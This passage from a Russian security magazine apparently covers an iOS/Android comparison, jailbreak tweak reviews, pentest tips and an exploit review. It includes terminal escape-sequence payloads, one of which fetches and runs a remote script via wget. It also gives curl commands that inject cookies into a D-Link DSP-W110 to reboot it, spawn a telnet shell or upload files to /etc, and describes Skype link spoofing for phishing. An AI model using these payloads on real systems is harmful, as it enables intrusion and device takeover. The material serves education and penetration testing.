и этой проблемой и добилась того, что на нексусах Android бегает как заводной
(включая Nexus 4, выпущенный три года назад), — добилась не за счет огра-
ничений, а благодаря интеллектуальному механизму выдавливания наиболее
прожорливых приложений из памяти.
  И да, еще одна серьезная проблема Android — это «оболочки» от произво-
дителя. В отличие от iOS и Windows Mobile, код Android открыт, поэтому любой
производитель может взять его и с чистой душой изменить ОС так, как ему
заблагорассудится. Обратная сторона медали в том, что компании сильно ув-
лекаются этим делом и в результате нашпиговывают прошивку таким количе-
ством функций, что она начинает лагать даже на топовом железе. А если гово-
рить о китайских аппаратах, то тут ситуация совсем плачевная.

ФУНКЦИОНАЛЬНОСТЬ
А это уже козырь андроидоводов. Действительно, в сравнении с Android iOS
просто игрушка. Без всяких root и на абсолютно залоченном аппарате Android
позволяет пользователю делать с устройством на порядок больше вещей.
Здесь тебе и разные рабочие столы, и выдвижные панели, и всплывающие
кнопки, и приложения с плавающим окном, и кнопки управления всем подряд
в шторке, и куча софта, способного в фоне не только играть музыку и обновлять
контент, но и копировать файлы и выполнять команды на удаленном сервере.
В конце концов, здесь есть Tasker, позволяющий полностью автоматизиро-
вать работу системы, здесь есть поддержка OTG с возможностью подключе-
ния практически любой USB-периферии (и да, она будет работать из коробки),
здесь есть браузеры на любой вкус и цвет, SSH-клиенты и много-много чего
еще. И повторюсь, все это работает без root и каких-либо вмешательств в си-
стему.
  Я мог бы сказать, что одна только функциональность Android легко убивает
все остальные достоинства iOS. Но я не стану, и вот почему. Любой, кто делал
jailbreak, знает, насколько iOS действительно функциональна. Она продолжает
проигрывать Android, но теперь уже не так сильно. И вывод, который можно
сделать из этого, прост: возможности iOS ограничены искусственно. Возника-
ет вопрос: зачем?
  На него есть два ответа, и они равно справедливы. Первый — произво-
дительность. Повторяем на счет три: «iOS должна работать быстро». С таких
слов начинается рабочий день программистов, ответственных за iOS. Ну лад-
но, не начинается, но вполне мог бы. Многие искусственные ограничения iOS
касаются именно производительности. Это и обсуждавшийся ранее (полу-)за-
прет на фоновое исполнение приложений,
и невозможность смены рабочего стола,
и менее очевидные запреты.
   Второй — безопасность. iOS должна
быть не только производительна, но и без-
опасна. Причем подразумевается в боль-
шей степени даже не защита от злоумыш-
ленников, а безопасность  в  контексте
«человек и устройство». Давайте будем
честными, изначально iPhone появился
как девайс для той части населения, кото-
рая не понимает в технике ровным счетом
ничего. Поэтому iOS — это сложная и во
многом очень продвинутая система, скры-
тая за простым красивым интерфейсом,
не допускающим вмешательства в свою
работу. Без jailbreak сделать что-то, что
приведет к ухудшению производительно-
сти или стабильности системы, практиче-
ски невозможно.
  Я бы мог приплести сюда еще и вопрос
денег, которые Apple серьезно бы недо-
получала, если бы позволила устанавли-   Такое в Android можно получить
вать сторонний софт откуда угодно, но мы   с помощью обычных приложений
все-таки говорим про оси, а не про бизнес.

ОБНОВЛЕНИЯ
И вновь мяч переходит к яблочникам. Да, ребята, восьмерка установлена уже
на 84% устройств, а Android 5 где-то на 10%. Разница ну очень велика, однако
давайте разберемся, что это значит на деле. Сколько устройств поддерживает
iOS 8.4? Правильно, пять смартфонов (4s, 5, 5s, 6, 6 plus), восемь планшетов
(2, 3, 4, air, air 2, mini, mini 2, mini 3) и iPod Touch. Итого четырнадцать устройств,
почти половина из которых работают на одном чипе. А теперь сколько смарт-
фонов, планшетов, приставок, телевизоров и HDMI-донглов получили обнов-
ление до Android 5? Не думаю, что кто-либо будет считать, но очевидно, что эта
цифра намного больше четырнадцати.
   Однако, как я уже сказал вначале, я не собираюсь мериться цифрами и чем
бы то ни было еще. Единственное, о чем я хочу сказать, — это существенное
различие в моделях распространения Android и iOS. Apple выбрала очень при-
ятный для себя путь развития, они выпускают ограниченный набор устройств,
сами разрабатывают для них ПО и сами же их обновляют (в кооперации с про-
изводителями комплектующих, естественно).
  Модель распространения Android совсем другая. Фактически все, что де-
лает Google, — просто выкладывает исходники новой версии ОС и позволя-
ет использовать их кому угодно. И уже сам производитель решает, стоит ли
ему заморачиваться с обновлением устройств до новой версии или выгоднее
выпустить новый аппарат. Большую роль также играют производители чипов,
так как именно они ответственны за портирование большей части ОС на свои
SoC’и. И к сожалению, единственный производитель чипов, который действи-
тельно занимается долгой поддержкой даже своей устаревшей продукции, —
это Qualcomm. Все остальные обычно просто забивают.
   Ну и конечно же, стоит вспомнить о нексусах, которые пилит сама Google.
Срок их поддержки составляет не менее двух лет, а то и больше.





                                   Официальная статистика распространенности
                                         Android на 1 июня 2015 года


БЕЗОПАСНОСТЬ И ВИРУСЫ
Этот пункт я оставил на закуску. Не потому, что он такой «вкусный», а пото-
му, что мы уже не единожды касались его косвенно. iOS действительно счи-
тается намного безопасней Android, и эта система обрела славу «свободной
от вирусов». Однако если мы посмотрим на аналитические отчеты секьюри-
ти-компаний, то Mac наравне с iOS по количеству уязвимостей окажется да-
леко не на последних местах. Более того, доказательство, что уязвимостей
в iOS предостаточно, лежит у нас перед глазами и называется jailbreak. Только
представь себе: почти каждая версия iOS содержит в себе критическую уяз-
вимость, позволяющую получить привилегии root (да, да, в iOS тоже есть root).
Недурно, не правда ли?
   Причин, по которой iOS считается такой безопасной, фактически две. Пер-
вая — это уже обсуждавшаяся закрытость ОС по отношению к пользователю
и сторонним приложениям. Написать вирус или троян для iOS, который не тре-
бовал бы jailbreak или не был подписан корпоративным сертификатом, прак-
тически нереально. Точнее реально, но это будет не троян, а пластмассовая
игрушка в виде коня на колесиках.
   Вторая — это закрытость ОС для установки приложений из сторонних
источников и жесткая политика Apple в отношении качества публикуемых в App
Store приложений. Здесь можно только поаплодировать, но, с другой стороны,
мы опять получаем стерильную систему, для которой нет даже клиента «ВКон-
такте». Play Store в этом свете выглядит куда выгоднее, здесь есть все: и софт,
требующий, и инсталляторы кастомных прошивок, и средства для организации
двойной загрузки — что только пожелаешь. Но за все надо платить, и в данном
случае платить приходится рисками окирпичить смартфон или подхватить за-
разу. Правило простое: получил root — пеняй на себя.





В 2014 году OS X и iOS возглавили список самых уязвимых ОС

В СУХОМ ОСТАТКЕ
Это, конечно же, не все, о чем можно рассказать, говоря о коренных различи-
ях в iOS и Android, но приведенных аргументов уже должно быть достаточно.
Главная мысль, которую я пытался донести, — это коренное различие имен-
но в идеологии систем. С одной стороны, у нас есть iOS, вылизанная, краси-
вая ОС с невероятно плавным интерфейсом, которую удобно использовать
для простых и незатейливых вещей типа позвонить, посмотреть почту, выло-
жить фоточку в Instagram. С другой стороны, есть Android — богатая возмож-
ностями и работающая на куче устройств ОС, позволяющая использовать
смартфон или планшет так же, как обычный ПК, и ни в чем не ограничивающая
пользователя, но зато страдающая от проблем, связанных с плавностью ин-
терфейса и безопасностью. Сравнивать эти две системы — такая же глупость,
как сравнивать Chevrolet Corvette и Land Rover Defender.
X-Mobile


ВЫПУСК #10.
И ВНОВЬ JAILBREAK
КАРМАННЫЙ
                      Сегодня в выпуске:
                       заставляем свернутые
                      приложения работать
                         в фоне, заменяем панельСОФТ                      быстрых настроек на
                      более функциональный
                           аналог, просматриваем
                        погоду с помощью свайпа
                      и запускаем действия
                              Activator в ответ на
                       получение уведомления.
                       Приятного чтения!





DISSIDENT

Платформа: iOS 8
Репозиторий: BigBoss
Цена: 2.99$

По умолчанию iOS останавливает испол-
нение приложения через несколько се-
кунд после "сворачивания", позволяя ему
использовать весьма ограниченный на-
бор API для выполнения фоновых задач.
Порой это создает проблемы, так как в не-
которых ситуациях софтину предпочти-
тельнее оставить работать в фоне. В ка-
честве примера можно привести загрузку
большого количества фотографий в обла-
ко, обновление списка писем в неофици-
альном почтовом клиенте и другие виды
синхронизаций данных.
   Для решения этой проблемы пять лет
назад  был  создан  твик  Backgrounder.
Backgrounder позволет сделать так, чтобы
в фоне могли работать не только стоковые
приложения, но и любые другие приложе-
ния, установленные из App Store. Твик уже
давно устарел и на смену ему пришли дру-
гие, однако в большинстве своем они не
совместимы с iOS 8. А вот Dissident — со-
вместим, причем он позволяет не только
глобально активировать фоновую работу
приложений, но и настроить ее индивиду-
ально для каждого выбранного приложения.
  Цена твика кусается, поэтому тем, кто
не уверен в его необходимости, мы ре-
комендуем для начала попробовать бес-
платный твик с аналогичной функциональ-
ностью: Watchdog Lite.




CONTROLPANE

Платформа: iOS 8
Репозиторий: BigBoss
Цена: еще недоступен

Панель быстрых настроек, доступная с по-
мощью свайпа с нижней стороны экрана,
стала едва ли не самым полезным и удоб-
ным нововведением iOS 7. Поэтому со-
всем не удивительно, что твик CCSettings,
вышедший вскоре после релиза семер-
ки и позволяющий изменять эту панель,
быстро обрел статус must  have. Однако,
сама организация панели в глазах многих
пользователей оставляет желать лучше-
го — а там, где есть запрос на изменение,
обязательно появится jailbreak-твик.
   ControlPane — это нечто вроде альтер-
нативной реализации панели быстрых на-
строек. Она доступна с помощью Activator,
выезжает с края экрана и включает в себя
гораздо больше тоглов, чем стандартная
панель. Кроме того, у нее есть приятный
бонус в виде возможности отключить пи-
тание или сделать респринг. Цена же до-
вольно демократична и составляет всего
один доллар.




WEATHERPEEK

Платформа: iOS 8
Репозиторий: BigBoss
Цена: еще недоступен

Возможность узнать сводку погоды всег-
да будет важной функцией любой мобиль-
ной операционки. iOS предоставляет для
этого довольно простой и удобный интер-
фейс, доступный в шторке. Однако благо-
даря Cydia мы всегда можем пойти немно-
го дальше и получить более интересный
вариант этой функции.
   WeatherPeek — не просто еще один
виджет погоды. Твик реализует совершен-
но новый подход к ее просмотру; главная
фишка — выдвигаемая слева от домашне-
го экрана (SpringBoard) панель с текущей
температурой и прогнозом на полторы
недели вперед. Это действительно бы-
стрый и удобный способ узнать прогноз.
Кроме того, твик реализует еще и виджет
для экрана блокировки, и даже позволяет
разместить прогноз в поиске Spotlight.
  На момент написания обзора твик еще
не был доступен для загрузки, поэтому
цену мы не указываем. Но вполне возмож-
но, что к моменту выхода журнала он уже
появился в репозитории BigBoss.




NOTIACTION

Платформа: iOS 8
Репозиторий: BigBoss
Цена: бесплатно

Все мы знаем, что такое Activator и как он
облегчает жизнь владельцам взломанных
устройств. Однако и его возможности,
оказывается, можно расширить. Это по-
воляет сделать NotiAction — инновацион-
ный (во многом) твик, который умеет ве-
шать действия Activator на, как бы странно
это ни звучало, уведомления.
   Работает  это  так: после  установки
NotiAction и его активации в настройках
Activator появляется 10 новых действий, на
каждое из которых можно повесить запуск
приложения или плагина. Каждое такое
действие в свою очередь можно привязать
к любому уведомлению (а точнее — тек-
сту, который содержит это уведомление).
В результате у тебя появляется возмож-
ность запускать приложения или активи-
ровать те или иные действия с помощью
отправки СМС или сообщения в любом
мессенджере. Или, например, отключать
WiFi, когда уровень заряда достигает кри-
тического минимума.
  Любые уведомления можно использо-
вать в качестве триггера для запуска тех
или иных действий Activator. И все это —
абсолютно бесплатно!
Взлом





Алексей «GreenDog» Тюрин, Digital Security
agrrrdog@gmail.com,,twitter.com/antyurin
EASY





                WARNINGHACKВся информация предоставлена исключительно в ознакомительных целях.
                               Лица, использующие данную информацию в противозаконных целях, могут
                              быть привлечены к ответственности.


Задача: проверить RDP сервисы

RDP — это Remote Desktop Protocol, специальный протокол для удалённого до-
ступа, который поддерживают все современные ОС семейства Windows. Это
один из основных протоколов для удалённого доступа в корпоративных сетях,
и потому он всегда был интересной целью для атак.
  При этом, более ранние версии протокола имели уязвимости, и можно
было провести MitM атаку. Сейчас с настройками по умолчанию такой про-
блемы нет, но из-за того, что в корпоративных сетях обычно используется
целый зоопарк операционных систем (и старых, и новых), каждая из кото-
рых поддерживает разные версии протокола RDP — их частичная несовме-
стимость между собой рождает нужду менять настройки, ослабляя защиту.
  При наличии в конфигурации определённых ошибок мы можем провести
MitM-атаку на RDP современных версий. Как выявить такую уязвимость?
Одного только знания версии ОС не хватит. Нам здесь поможет скрипт,
разработанный в Portcullis Labs.
   Скрипт на Perl подключается по очереди к серверам (порт 3389) и за-
прашивает поддерживаемые настройки подключения, на основании чего
и выводит предположение об уязвимости RDP-сервиса к той или иной ата-
ке. Аутентификация не требуется. То, что нужно для пентестов!

Задача: провести фишинг, используя Skype

Skype сейчас стал одним из самых популярных средств общения в бизнес-сре-
де. В итоге многим сотрудникам компаний приходится общаться с «анонимны-
ми» людьми из Интернета. Это открывает ещё один вектор для проведения атак
с использованием социальной инженерии.
   У Skypе есть одна особенность: когда мы вводим URL сайта (к примеру,
http://server.com), он преобразует ее в ссылку, и именно в таком виде она
показывается собеседнику. При этом в силу внешней «солидности» Скайпа
он пользуется большим доверием, нежели почта или другие мессенджеры.
Многие думают, что скрыть за ссылкой адрес другого сайта невозможно,
однако это не так.
  На эту тему была небольшая заметка, которая рассказывает, как это сде-
лать. Всё, что нам требуется — воспользоваться официальной веб-версией
Skype, которая сейчас проходит бета-тестирование. Если отправить через
нее ссылку http://google.com/zzzz, то на сервер (на домене client-s.
gateway.messenger.live.com) посылается запрос классического вида
   <a href="http://google.com/zzzz">http://google.com/zzzz</a>.
И здесь мы можем изменить значение href на интересующее нас. В итоге изме-
ненная ссылка попадет в Skype жертвы.





Подменяем значение в запросе

                       А вот куда ведет ссылка


  Кроме обычных схем типа http, можно использовать и специфичные
для скайпа (skype:). Однако если жертва наведет курсор мыши на под-
дельную ссылку и подождет подсказки, то увидит настоящий путь.

Задача: получить список уязвимых библиотек

Недавно в хит-парад уязвимостей OWASP добавился новый пункт «A9 — Using
Components with Known Vulnerabilities», то есть использование в ПО каких-то
сторонних компонентов или библиотек с известными уязвимостями.
  Сейчас это большая проблема. Мой опыт пентестов показывает, что
многие крупные системы рушатся из-за уязвимостей компонентах «третьей
стороны». Типичный пример: серверы ESX VMware используют уязвимую
к HeartBleed версию библиотеки OpenSSL. Конечно, современные версии
уже не уязвимы, но из-за того, что разработчики VMware часто натыкались
на грабли с уязвимыми компонентами, они стараются использовать по-
следние версии дополнительного ПО. Потому они и перешли на первую
ветку OpenSSL, и потому же было выпущено много серверов ESX с уяз-
вимой библиотекой. Но из-за трудностей обновления ESX в корпоратив-
ных сетях до сих пор полно уязвимых серверов. VMware обвинять не стоит:
всякое случается, и где только не находят уязвимости. А мы, пентестеры,
просто пользуемся этим ^_^
   Есть и вендоры, которые в свое новое ПО суют старые библиотеки с из-
вестными уязвимостями. Почему бы им не использовать новые библиоте-
ки? Вряд ли кто-то ответит.
  Забавный пример можно привести про RomPager, веб-сервером
для встраиваемых систем. Он очень распространён: SOHO-роутеры, МФУ,
всякие другие штуки (где-то видел RomPager на девайсе для контроля до-
ступа в здание). В прошлом году в нем было найдено несколько уязвимо-
стей, при том что уязвимости эти были исправлены ещё 2005 году! Поче-
му-то все вендоры до сих пор используют именно старую, уязвимую версию
RomPager 2002 года.
   Задача выявления таких проблем не особенно трудна. Часто получить
список библиотек или других компонентов можно даже для закрытого ПО.
Анализ имен библиотек (или даже хеш-сумм компонентов) и различных
файлов с манифестами дает неплохие результаты, по которым можно про-
изводить поиск. Для этого существует масса самопальных скриптов.
  В первую очередь достоин упоминания проект самого OWASP — OWASP
Dependency-Check. Сейчас он поддерживает .NET, Java и Python. Есть
как отдельная консольная утилита, так и версии для Ant, Maven и Jenkins.
OWASP Dependency-Check разными способами пытается распознать вер-
сии компонентов, найти их в Common Platform Enumeration и по нему уже
искать информацию об уязвимостях (CVE). Конечно, ложные срабатывания
и упущения свойственны и этой тулзе, но, тем не менее, она неплохо под-
ходит на роль основной.

Задача: атака на терминал
через escape sequence injection

Ещё одна древняя, но интересная атака дошла до нашей рубрики. Речь
об Escape sequence injection — инъекциях управляющих последовательностей
(они же — эскейп-последовательности). Если у тебя в голове всплыли воспо-
минания об эскейп-последовательностях из какого-нибудь языка программи-
рования — это тоже неплохо, хотя и не совсем то же самое.
  Начнём с мини-экскурса в историю. Когда-то давно (в 70х-80х) для ра-
боты с компьютером использовались терминалы. Терминал — это устрой-
ство ввода-вывода, в котором, считай, почти ничего нет, кроме платы с кон-
троллером, монитора и клавиатуры. Тем или иным способом терминалы
подключались к компьютеру. Никаких операций на них не производилось,
но важно понимать, что терминал — это всё же не монитор, в поздние тер-
миналы даже устанавливались микропроцессоры.

                                                        Терминал vt100





Для того чтобы терминалу можно было указать, как отображать данные, были
придуманы управляющие последовательности. Простейший пример — изме-
нение цвета символов или фона, а также перемещение курсора. Так как канал
связи был один, сами данные и команды по управлению терминалом (эскейп-по-
следовательности) передавались одним потоком. И как раз по символу esc
(0x1B в ASCII) терминал мог понять, что далее идет команда. Сам набор после-
довательностей был стандартизирован.
  Несмотря на количество прошедших лет, идейно тут ничего не измени-
лось, просто теперь вместо железного терминала в *nix-системах появи-
лись tty (от слова «телетайп» — именно их использовали в качестве пер-
вых терминалов). Это эмулятор терминала. За основу чаще всего берется
терминал DEC vt100. Кроме того, в каждой графической среде есть свой
терминал: xterm, gnome-terminal, konsole в KDE и так далее. К ним же отно-
сится и PuTTY, у которого есть версия для Windows. Все они поддерживают
эскейп-последовательности.
  Сами эскейп-последовательности бывают двух видов. Оба вида начи-
наются с символа esc (\e), а дальше идет символ для указания команды.
Есть ещё последовательности с параметрами (одним или двумя), которые
начинаются с символов \e[ или \e]. Общий вид для них примерно такой:

\e[параметр1;параметр2;команда

Простейший способ опробовать эту фичу — при помощи команды echo с пара-
метром –e, который разрешает использование эскейп-последовательностей:

echo -e "asdasdsad \e[00;35mzzzzzzzz \e[00;31mRED"

Сначала мы указываем розовый цвет, а потом красный. Заметь (см. скришот),
что эскейп-последовательность влияет и на весь последующий вывод в консоли.





Пример использования управляющей последовательности

Важно, что это именно фича терминала, а не шелла. В подтверждение этого
сохраним вывод из echo в файл и выведем его в терминал при помощи cat.
На следующем скриншоте ты можешь увидеть, что результат аналогичный.





Пример последовательности с cat

И наконец, мы приходим к концепту атаки. Мы, как атакующие, можем по-
влиять на терминал нашей жертвы, если можем писать в какой-то файл,
который впоследствии будет выведен жертвой в терминале.
  Самих последовательностей очень много, к тому же, несмотря на стан-
дарт, бывают отличия в командах и их параметрах для различных термина-
лов. Среди них есть очень коварные возможности. В исследовании за 2003
год приводятся два дельных примера.
   Если терминал поддерживает выгрузку экранного буфера в файл, то мы
можем получить RCE в ОС. Мы должны вставить следующую последова-
тельность:

\ecany_text_here\n\e]55;/path/to/any_file\a

где \ec — esc-символ, а c указывает эмулятору терминала полностью очи-
стить экран. Дальше идет any_text_here\n — любые наши данные, кото-
рые будут выведены на экран. Переносы строк разрешены. e]55;/path/
to/any_file\a – команда, по которой терминал должен сохранить всё, что
отображено на экране (то есть наш текст any_text_here\n) в файл по про-
извольному пути. Так мы можем написать минишел на PHP и, например,
и пихнуть его в директорию веб-сервера.
   Работала эта атака для эмуляторов ETerm и  rxvt. Последний вроде
как до сих пор уязвим.
  Следующему примеру подвержено большинство терминалов, включая
xterm и PuTTY. Но атака эта — с элементом социальной инженерии. Осно-
вывается она на том, что с помощью управляющей последовательности мы
можем поменять заголовок (title) у терминала, и что важнее – вывести его
значение:

\e]2;;wget 127.0.0.1/.bd;sh .bd;exit;\a\e[21t\e]2;
    xterm\aPress Enter>\e[8m;

где \e]2 — код для смены заголовка эмулятора. Туда мы в качестве параме-
тра кладем нашу боевую нагрузку ;wget 127.0.0.1/.bd;sh .bd;exit;\a:
она скачивает шелл-скрипт с внешнего ресурса и запускает его. После-
довательность \e[21t заставляет вывести в консоль значение заголовка.
Это значение становится следующей командой для консоли, как будто ад-
министратор сам ввёл её.
  Но есть серьезная проблема: используя эскейп-последовательности,
мы не можем запустить введенную команду. Нужна уловка, которая заста-
вит администратора нажать на Enter самостоятельно. Вот неплохой ва-
риант действий: мы возвращаем прежнее значение заголовка терминала
(\e]2;xterm\a), а после выводим значение Press Enter> и скрываем при-
ветствие от консоли и выведенную ранее команду с пейлоадом с помощью
последовательности >\e[8m;.
   Таким образом, администратор видит только просьбу нажать Enter,
а ввод каких-то команд с клавиатуры ему не отображается.





Пример смены заголовка в xterm

Я попробовал эту атаку на нескольких современных терминалах, и вторая
стадия — с выводом значения заголовка в консоль — не работает. Несмо-
тря на это, возможность заметно влиять на отображение строк в консоли
кажется мне интересной. В дополнение к каким-то другим атакам это мо-
жет пригодиться.
  Последний важный момент: как подсунуть нашу управляющую после-
довательность в какой-то файл админа, не имея доступа в ОС? Типовое
решение — лог-файлы. Админы их достаточно часто смотрят, используя
типовые тулзы. Достаточно часто мы можем повлиять на содержимое ло-
гов удалённо: например, не так давно (в CVE 2013 года) рассказывалось
об уязвимости в Apache, с помощью которой можно было специальным
запросом заинжектить свою эскейп-последовательность в лог ошибок.
Аналогичные проблемы были найдены относительно недавно в веб-сервах
Jetty и Webrick.

Задача: Атаковать Cisco c Tacacs+

За безумным словосочетанием Terminal Access Controller Access-Control System
Plus (TACACS+) скрывается специальный протокол Cisco для AAA (authentication,
authorization and accounting). Проще говоря, это протокол для централизованно-
го управления доступом — чаще всего доступом именно к оборудованию Cisco,
но не только к нему. Кстати, роутеры, свитчи и другие девайсы Cisco поддержи-
вают еще и протокол RADIUS, но нас в на этот раз интересует именно Tacacs+.
  Обычно поднимается один-два сервера с сервисом Tacacs+ (49/TCP)
и на всех девайсах настраивается их использование. Когда кто-то хочет
аутентифицироваться на свиче, его креды со свича передаются на сервер
Tacacs+, где проходит проверка и принимается решение о разрешении
доступа.
   Это удобное и централизованное решение с поддержкой логирования
доступа. На серверной стороне можно прикрутить другую централизацию
доступа — что-нибудь вроде AD или LDAP. К тому же есть опенсорсные реа-
лизации сервера — в Cisco когда-то решили официально опубликовать код.
  С точки зрения безопасности протокол далек от идеала (ведь он был
спроектирован в 1993 году), но критичных проблем у него нет. Данные
передаются либо плейнтекстом, либо можно включить шифрование (что
и является, насколько мне известно, стандартом). Организуется шифрова-
ние на основе PSK (PreShared Key), то есть администратор сам указывает
один ключ на сервере Tacacs+ и всех подключающихся к нему устройствах.
Шифруются только пользовательские данные, заголовки Tacacs+ не шиф-
руется.
  Само шифрование происходит следующим образом. При помощи XOR
данные пакета объединяются с последовательностью хешей MD5, которая
называется pseudo_pad:

pseudo_pad = {MD5_1 [,MD5_2 [ ... ,MD5_n]]}

Хеши MD5 генерируются на основании данных из заголовков пакетов
Tacacs+, к которым добавляется PSK и предыдущий хеш:

MD5_1 = MD5{session_id, key, version, seq_no}
MD5_2 = MD5{session_id, key, version, seq_no, MD5_1}
...
MD5_n = MD5{session_id, key, version, seq_no, MD5_n-1}

где session_id — случайный идентификатор сессии, version — версия
протокола, seq_no – инкрементируемый номер пакета, а key – PSK.
  В 2000 году Solar Designer провел интересное исследование протокола,
в котором была обнаружена возможность replay-атак, раскрытия длины па-
роля пользователя (из-за отсутствия padding) и кое-что ещё. Но данные ата-
ки до практического использования не дотягивают (готовых тулз точно нет).
   Что же мы можем сделать как пентестеры? Во-первых, мы можем про-
вести MitM атаку и проснифить подключение от устройства Cisco к серверу
Tacacs+. Далее нам понадобится локально брутфорсить трафик, а точнее —
перебирать различные варианты PSK. С одной стороны, с нынешними мощ-
ностями MD5 – это очень быстро, с другой — брутфорс Tacacs+ не вклю-
чен не в одну известную мне утилиту.
  Но попробовать кое-что всё же можно. Во-первых, есть тулза Loki. Это
некий комбайн для атак на L3-протоколы. Признаюсь, обнаружил я ее толь-
ко недавно, но с виду она работает хорошо и умеет делать ряд интересных
штук. Вездесущий Wireshark тоже позволяет расшифровать трафик Tacacs+
при имеющемся ключе (Edit -> Preferences -> Protocol -> Tacacs).
  Кроме атаки, связанной с брутфорсом и перехватом трафика, есть ещё
две вещи, о которых стоит рассказать. Представим себе, что с сервером
Tacacs+ что-то произошло, и он не доступен для устройства Cisco, но ад-
мину может понадобиться залогиниться на этот девайс. Для таких целей
устройства Cisco поддерживают разные способы аутентификации, кото-
рые администратор должен указать при настройке.
   Классическая конфигурация аутентификации для Cisco c Tacacs+ вы-
глядит следующим образом:

aaa authentication login default group Tacacs+ local

Нам здесь важны последние два слова, которые указывают, что сначала
аутентификация будет проверена с помощью Tacacs+, а после — в локаль-
ной базе юзеров. Причём, если юзер не найден в Tacacs+, то он не будет
проверяться локально.
  В этом случае немаловажен человеческий фактор. Если администра-
тор понадеется на Tacacs+, в локальной базе он может выставить менее
секьюрные логины и пароли, и этим легко воспользоваться.
  Мы можем попытаться тем или иным способом заблокировать доступ
от девайся Cisco к серверу Tacacs+. В результате устройство будет ис-
пользовать локальную базу учеток, и перебирать пароли мы будем в ней
(через Telnet или SSH). Например, мы можем использовать какую-нибудь
MitM-атаку или DoS-атаку на сам сервис Tacacs+. Во втором случае мы про-
сто создадим большое количество подключений, отчего сервис не сможет
получать новые. Этот способ не был мною протестирован, но с другими
TCP-сервисами работает отлично.
  Плюс в том, что наш брут скорее всего не будет зафиксирован в логах.
Но есть и минус: другие девайсы Cisco тоже не смогут работать с Tacacs+,
что должно вызвать беспокойство у администраторов. Также у этой ата-
ки есть и второй недостаток: очень часто серверы Tacacs+ располагаются
в VLAN, которые доступны только для администраторов и сетевого обору-
дования — это рекомендации Cisco.
  Спасибо за внимание и успешных познаний нового!
Взлом





                                                                           Борис «dukeBarman
                                                                                        Рютин»,
                                                                                   Цифровое оружие
                                                                                           и защита
                                                                                                              b.ryutin@zorsecurity.ru,
                                                                                         @dukebarman,
                                                                                                 dukebarman.pro

     WARNING

       Вся информация
     предоставлена исклю-
       чительно в ознако-
       мительных целях.
    Ни редакция, ни автор
     не несут ответственно-
      сти за любой возмож-
    ный вред, причиненный
     материалами данной
             статьи.

ОБЗОР
ЭКСПЛОЙТОВ
 АНАЛИЗ СВЕЖЕНЬКИХ УЯЗВИМОСТЕЙ





    В сегодняшнем обзоре мы разберем уязвимости, которые
    в некоторой степени банальны, но при этом были обнаружены
      в популярном ПО. Несколько уязвимостей было найдено
    в устройстве D-Link DSP-W110, и одна интересная уязвимость
   обнаружилась в актуальной версии популярной операционной
      системы OS X Yosemite. На момент написания текста эта
                уязвимость так и не исправлена.

МНОГОЧИСЛЕННЫЕ УЯЗВИМОСТИ В D-LINK DSP-W110

 CVSSv2         нет
 Дата релиза:  12 июня 2015
 Автор:           Peter Adkins
 CVE:            нет

Патчи для  lighttpd, добавленные D-Link, сделали это устройство уязвимым
к SQL-инъекции и выполнению произвольного кода. Это произошло из-за недо-
статочной фильтрации данных, приходящих от пользователя.
   Для доступа к сервису lighttpd не требуется аутентификация, что позволяет
атакующему выполнять команды на устройстве с правами администратора при
выполнении обычного HTTP-запроса.
   Проблема вызвана тем, что содержимое cookie из HTTP-запроса с любым
именем передается как есть в функцию sprintf() и используется для форми-
рования SQL-запроса для проверки существующих сессий. Поэтому достаточ-
но отправить HTTP-запрос с правильно сформированным набором печенек,
чтобы внутренняя СУБД sqlite выполнила произвольный SQL-код.
  Еще одна проблема заключается в том, что SQL-запрос передается в функ-
цию popen() и будет выполнен после HTTP-запроса. Это позволяет нам вы-
полнять на устройстве произвольные команды, да ещё и с правами админи-
стратора.
   Правда, у этой ошибки есть ограничение (длина выделенного буфера), по-
этому значение cookie не должно превышать девятнадцать символов. Но та-
кого размера вполне хватает для перезагрузки устройства или запуска шелла
(Telnet).
  Ещё одна уязвимость — загрузка произвольных файлов на устройство. Суще-
ствующий скрипт для загрузки файлов содержит некоторый фильтр, который мож-
но обойти, если указать в запросе прямой путь и не использовать аргумент dev.
   Третья уязвимость позволяет атакующему получить следующую информацию:
•  текущие WLAN SSIDs;
•  текущие WLAN каналы;
•  LAN и WAN MAC адреса;
•  текущую версию прошивки;
•  информацию о «железе».

Разберём подробно первую уязвимость. Её причина тривиальна. Во время обра-
ботки заголовков HTTP входящего запроса, пропатченный lighttpd копирует все
cookie, найденные в запросе, внутрь hnap_cookie из request.c (строка 845).





Обработка HTTP-запроса в D-link DSP-W110

Cookie обрабатываются внутри mod_hnap.c, где их значение получается из
строки (строка 30).





Обработка HTTP-запроса в D-link DSP-W110

Далее это значение копируется в SQL-запрос с помощью функции sprintf()
(строка 56) и затем используется в функции popen() (строка 64).





Обработка http-запроса в D-link DSP-W110

В итоге у нас получился показательный пример уязвимости, демонстрирующий,
как не нужно обрабатывать данные, поступившие от пользователя — особен-
но, если это и SQL-запрос и команда, которая идет в шелл администратора.

EXPLOIT
Приведу примеры выполнения произвольных команд. Перегрузка устройства:

# curl \
 --cookie "terribleness='\'reboot\`" \
 192.168.1.3

Запустить шелл (telnet):

# curl \
 --cookie "terribleness=\'telnetd -l/bin/sh\'" \
 192.168.1.3

Загрузка файлов:

# echo 'Some String' > test.txt
# curl \
 -X POST \
 -i \
 -F name=@test.txt \
 --http1.0 \
 '192.168.1.3/web_cgi.cgi?&request=UploadFile&path=/etc/'

Пример раскрытия информации:

# curl \
 192.168.1.3/mplist.txt

Автор, помимо отчёта об уязвимости, опубликовал эксплоит на Ruby, который
с легкостью портировали в Metasploit. Для проведения атаки можно использо-
вать как свои скрипты, так и готовые, или же взять модуль msf:

msf > use exploit/linux/http/dlink_dspw110_cookie_noauth_exec





Запуск эксплоита для DSP-W110

TARGETS
D-Link DSP-W110 (Rev A) — v1.05b01

SOLUTION
Есть исправление от производителя


ПОВЫШЕНИЕ ПРИВИЛЕГИЙ В OS X 10.10
ЧЕРЕЗ DYLD_PRINT_TO_FILE

 CVSSv2         нет
 Дата релиза:  7 Июля 2015
 Автор:           Stefan Esser
 CVE:            нет

С релизом OS X 10.10 Apple добавила несколько новых функций в динамический
компоновщик dyld. Одна из них — новая переменная окружения DYLD_PRINT_
TO_FILE, которая включает логирование ошибок в произвольный файл.
   DYLD_PRINT_TO_FILE — это путь к (записываемому) файлу. Обычно дина-
мический компоновщик пишет весь лог (вызванный с помощью настроек, кото-
рые начинаются с DYLD_PRINT_) в файловый дескриптор 2 (обычно это stderr).
Но эта опция позволяет выводить лог в специальный файл.
  С введением этой переменной обычные средства защиты, которые необ-
ходимы при добавлении поддержки новых переменных окружения в динамиче-
ском компоновщике, не были использованы. Поэтому её могут использовать
